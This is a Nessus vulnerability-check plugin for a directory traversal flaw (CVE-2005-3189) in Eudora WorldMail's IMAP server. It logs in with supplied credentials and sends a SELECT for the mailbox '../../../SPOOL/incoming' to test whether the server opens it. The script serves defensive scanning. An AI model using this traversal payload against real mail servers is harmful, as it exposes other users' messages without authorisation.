#
# (C) Tenable Network Security
#


if (description) {
  script_id(20224);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3189");
  script_bugtraq_id(15488);

  script_name(english:"WorldMail IMAP Server Directory Traversal Vulnerability");
  script_summary(english:"Checks for directory traversal vulnerability in WorldMail IMAP server");

  desc = "
Synopsis :

The remote IMAP server is affected by a directory traversal flaw. 

Description :

The remote host is running Eudora WorldMail, a commercial mail server
for Windows. 

The IMAP server bundled with the version of WorldMail installed on the
remote host fails to filter directory traversal sequences from mailbox
names and fails to restrict access to mailboxes within its spool area. 
An authenticated attacker can exploit these issues to read and manage
the messages of other users on the affected application as well as to
move arbitrary folders on the affected system.  Such attacks could
result in the disclosure of sensitive information as well as affect
the stability of the remote host itself. 

See also : 

http://www.idefense.com/application/poi/display?id=341&type=vulnerabilities

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";
  script_description(english:desc);
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("imap/login and/or imap/password are empty; skipped!", level:0);
  exit(0);
}


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner and make sure it looks like WorldMail's.
s = recv_line(socket:soc, length:1024);
if (
  !strlen(s) || 
  "WorldMail IMAP4 Server" >!< s
) {
  close(soc);
  exit(0);
}


# Try to log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}


# If successful, try to exploit the flaw.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  mailbox = "../../../SPOOL/incoming";
  c = string("nessus", string(tag), " SELECT ", mailbox);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # There's a problem if we were successful.
  # eg, "nessus3 OK [READ-WRITE] opened ../../../SPOOL/incoming".
  if (resp && resp =~ "OK" && string("opened ", mailbox) >< s) {
    security_note(port);
  }
}
else if (resp =~ "NO") {
  if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
